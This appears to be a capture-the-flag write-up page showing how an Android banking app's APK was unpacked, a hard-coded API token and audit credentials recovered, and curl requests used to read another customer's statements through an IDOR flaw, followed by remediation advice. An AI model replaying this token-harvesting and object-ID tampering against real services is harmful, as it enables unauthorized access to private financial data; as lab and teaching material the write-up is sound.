@@ -1,0 +1,147 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DEADFACE CTF — Hard Kept Secrets: De Monne Financial IDOR — arwah</title><meta name="description" content="The app exposes an insecure direct object reference (IDOR): an authenticated audit user who owns no accounts can still request records for another account by changing the numeric account…"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Mobile / API · 5 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#1-result">1. Result</a></li><li><a href="#2-challenge-goal">2. Challenge goal</a></li><li><a href="#3-identify-and-unpack-the-application">3. Identify and unpack the application</a></li><li><a href="#4-do-not-submit-the-embedded-decoys">4. Do not submit the embedded decoys</a></li><li><a href="#5-reverse-engineer-the-api-client">5. Reverse engineer the API client</a></li><li><a href="#6-recover-usable-credentials">6. Recover usable credentials</a></li><li><a href="#7-confirm-the-idor">7. Confirm the IDOR</a></li><li><a href="#8-flag">8. Flag</a></li><li><a href="#9-security-impact-and-remediation">9. Security impact and remediation</a></li><li><a href="#10-evidence-boundary">10. Evidence boundary</a></li></ul></details><article class="prose"><h1 id="deadface-ctf-hard-kept-secrets-de-monne-financial-idor">DEADFACE CTF — Hard Kept Secrets: De Monne Financial IDOR</h1>
+<p><strong>Category:</strong> Mobile reverse engineering / API authorization<br />
+<strong>Artifact:</strong> <code>app-release.zip</code> → <code>app-release.apk</code><br />
+<strong>Package:</strong> <code>com.demonne.financial</code><br />
+<strong>Analyst:</strong> bratxer</p>
+<h2 id="1-result">1. Result</h2>
+<pre><code class="language-text">deadface{IDOR_u_2_f1nD_m0r3_Fl4gz}
+</code></pre>
+<p>The proof flag is stored in the internal-audit statement for account <code>1007</code>:</p>
+<pre><code class="language-text">RESTRICTED — De Monne Financial Internal Audit Division |
+Ref: deadface{IDOR_u_2_f1nD_m0r3_Fl4gz} |
+All ledger entries verified and reconciled. No discrepancies found.
+</code></pre>
+<p>The app exposes an insecure direct object reference (IDOR): an authenticated audit user who owns no accounts can still request records for another account by changing the numeric account ID in the API path.</p>
+<h2 id="2-challenge-goal">2. Challenge goal</h2>
+<p>The prompt says DEADFACE can obtain details from nearly any De Monne customer, but does not reveal which user or password they used. We are given a release APK and must recover the flag left as proof.</p>
+<p>The important distinction is that strings resembling flags in the APK are not automatically the answer. They must be tied to the intended customer-data access path and verified against the live CTF API.</p>
+<h2 id="3-identify-and-unpack-the-application">3. Identify and unpack the application</h2>
+<pre><code class="language-bash">file /home/arwah/Downloads/app-release.zip
+sha256sum /home/arwah/Downloads/app-release.zip
+unzip -l /home/arwah/Downloads/app-release.zip
+</code></pre>
+<p>The ZIP contains one file:</p>
+<pre><code class="language-text">app-release.apk
+</code></pre>
+<p>Archive SHA-256:</p>
+<pre><code class="language-text">5530926b2e564615285d15674ddb21c316f673d7d240f9fcfa36c6afb99f5c0c
+</code></pre>
+<p>Extract and identify the APK:</p>
+<pre><code class="language-bash">unzip -p /home/arwah/Downloads/app-release.zip app-release.apk &gt; /tmp/demonne-app-release.apk
+file /tmp/demonne-app-release.apk
+sha256sum /tmp/demonne-app-release.apk
+</code></pre>
+<p>Observed artifact identity:</p>
+<pre><code class="language-text">/tmp/demonne-app-release.apk: Android package (APK)
+SHA-256: 59bb5fcde89036724d380554046f1dde1b7b3cddf87059751e9e02bae787a793
+</code></pre>
+<p>The APK reports package <code>com.demonne.financial</code>, version <code>2.4.1</code> (<code>versionCode</code> 5), and declares the <code>INTERNET</code> permission. Its manifest also permits cleartext network traffic through <code>android:usesCleartextTraffic=&quot;true&quot;</code>.</p>
+<h2 id="4-do-not-submit-the-embedded-decoys">4. Do not submit the embedded decoys</h2>
+<p>Searching the DEX files exposes two visible but incorrect flags:</p>
+<pre><code class="language-text">deadface{flaG_ManIfesT3d}
+deadface{Ur_N0t_A110wEd_h3r3}
+</code></pre>
+<p>The first comes from <code>com.demonne.financial.internal.DiagnosticActivity</code>. The Android manifest declares that activity as exported, and the activity builds a diagnostics screen containing:</p>
+<pre><code class="language-text">diagnostic.code : deadface{flaG_ManIfesT3d}
+status          : internal build — not for distribution
+</code></pre>
+<p>This flag is deliberately labelled as a diagnostic code, rather than customer-data proof.</p>
+<p>The second string appears in a static “Q1 2026 Security Verification” document bundled with the application. It calls itself an authorization code and says the document is for authorized internal use. It also does not demonstrate the stated cross-customer data-access weakness.</p>
+<p>Both strings are static APK content. The challenge’s intended evidence is in a remote customer-data record reached through the app’s API logic.</p>
+<h2 id="5-reverse-engineer-the-api-client">5. Reverse engineer the API client</h2>
+<p>The relevant application classes are:</p>
+<pre><code class="language-text">com.demonne.financial.api.ApiClient
+com.demonne.financial.api.ApiService
+com.demonne.financial.api.AuthInterceptor
+com.demonne.financial.api.InternalTokenInterceptor
+com.demonne.financial.models.LoginRequest
+</code></pre>
+<p><code>ApiClient</code> configures Retrofit with this base URL:</p>
+<pre><code class="language-text">http://dmf.dctf.io:8081/
+</code></pre>
+<p>It also hard-codes an internal API token:</p>
+<pre><code class="language-text">zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR
+</code></pre>
+<p><code>InternalTokenInterceptor</code> adds it to every API request:</p>
+<pre><code class="language-java">request.newBuilder()
+    .header(&quot;X-Internal-Token&quot;, token)
+    .build();
+</code></pre>
+<p><code>AuthInterceptor</code> retrieves the logged-in session token and adds it as:</p>
+<pre><code class="language-text">Authorization: Bearer &lt;session token&gt;
+</code></pre>
+<p>The Retrofit service defines the following relevant endpoints:</p>
+<pre><code class="language-text">POST /api/auth/login
+GET  /api/accounts
+GET  /api/accounts/{id}/transactions
+GET  /api/accounts/{id}/statements
+GET  /api/auth/me
+</code></pre>
+<p>The two <code>{id}</code> endpoints are the important attack surface. The account ID is supplied directly in the URL, so the API must validate that the authenticated user is authorized to access that particular account.</p>
+<h2 id="6-recover-usable-credentials">6. Recover usable credentials</h2>
+<p>The release APK contains a valid audit account and password:</p>
+<pre><code class="language-text">email:    audit@demonne-financial.local
+password: demonnefinancial
+</code></pre>
+<p><code>LoginRequest</code> confirms that login JSON uses <code>email</code> and <code>password</code> fields. Authenticate using the headers reproduced from the app:</p>
+<pre><code class="language-bash">internal_token='zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR'
+
+curl -fsS \
+  -H &quot;X-Internal-Token: $internal_token&quot; \
+  -H 'Content-Type: application/json' \
+  --data '{&quot;email&quot;:&quot;audit@demonne-financial.local&quot;,&quot;password&quot;:&quot;demonnefinancial&quot;}' \
+  http://dmf.dctf.io:8081/api/auth/login
+</code></pre>
+<p>The response provides a bearer token and identifies the user as <code>Audit System</code>. Its profile message contains another decoy, <code>deadface{l3FT_b3Hind!}</code>. This does not satisfy the prompt either: it is a message belonging to the known audit user, not evidence recovered from another customer’s data.</p>
+<h2 id="7-confirm-the-idor">7. Confirm the IDOR</h2>
+<p>First request the audit account’s own account list:</p>
+<pre><code class="language-bash">curl -fsS \
+  -H &quot;X-Internal-Token: $internal_token&quot; \
+  -H &quot;Authorization: Bearer $session_token&quot; \
+  http://dmf.dctf.io:8081/api/accounts
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-json">[]
+</code></pre>
+<p>The account list is empty. The audit user therefore has no account returned by the normal “my accounts” API.</p>
+<p>Despite that, the API returns statement data for account <code>1007</code> when the account ID in the URL is changed:</p>
+<pre><code class="language-bash">curl -fsS \
+  -H &quot;X-Internal-Token: $internal_token&quot; \
+  -H &quot;Authorization: Bearer $session_token&quot; \
+  http://dmf.dctf.io:8081/api/accounts/1007/statements
+</code></pre>
+<p>The record containing the flag is:</p>
+<pre><code class="language-json">{
+  &quot;account_id&quot;: 1007,
+  &quot;id&quot;: 4,
+  &quot;period&quot;: &quot;Q1 2026 Internal Audit Summary&quot;,
+  &quot;reference&quot;: &quot;AUD-2026-Q1-99001&quot;,
+  &quot;summary&quot;: &quot;RESTRICTED — De Monne Financial Internal Audit Division | Ref: deadface{IDOR_u_2_f1nD_m0r3_Fl4gz} | All ledger entries verified and reconciled. No discrepancies found.&quot;
+}
+</code></pre>
+<p>This is direct evidence of an IDOR/BOLA issue:</p>
+<ol>
+<li>The request is authenticated.</li>
+<li>The user’s own account-list response is empty.</li>
+<li>The same user can nevertheless read account <code>1007</code> by placing that ID in a path parameter.</li>
+<li>The returned record contains the CTF’s proof flag.</li>
+</ol>
+<h2 id="8-flag">8. Flag</h2>
+<pre><code class="language-text">deadface{IDOR_u_2_f1nD_m0r3_Fl4gz}
+</code></pre>
+<h2 id="9-security-impact-and-remediation">9. Security impact and remediation</h2>
+<p>This is broken object-level authorization (BOLA), often called an IDOR. Authentication answers “who is calling?” Authorization must also answer “is this caller allowed to access this particular account?” The server performed the first check but evidently omitted or mishandled the second one for the account-specific endpoints.</p>
+<p>The client-side hard-coded <code>X-Internal-Token</code> makes matters worse: anyone who obtains the APK can reproduce the header. Still, removing the token from the application does not fix the core issue. Each server-side account lookup must be scoped to the authenticated principal, for example:</p>
+<pre><code class="language-sql">SELECT ...
+FROM statements
+WHERE account_id = :requested_account_id
+  AND account_id IN (
+      SELECT account_id
+      FROM account_owners
+      WHERE user_id = :authenticated_user_id
+  );
+</code></pre>
+<p>The API should return an authorization failure for records outside the caller’s scope, keep internal service tokens only in server-controlled systems, and add integration tests that attempt cross-account reads with low-privilege accounts.</p>
+<h2 id="10-evidence-boundary">10. Evidence boundary</h2>
+<p>All app behavior described from the APK is based on static reverse engineering. The API observations come from authenticated, read-only requests to the supplied DEADFACE CTF endpoint. No customer records were altered, no password guessing was used, and no flag submission was performed during this investigation.</p>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
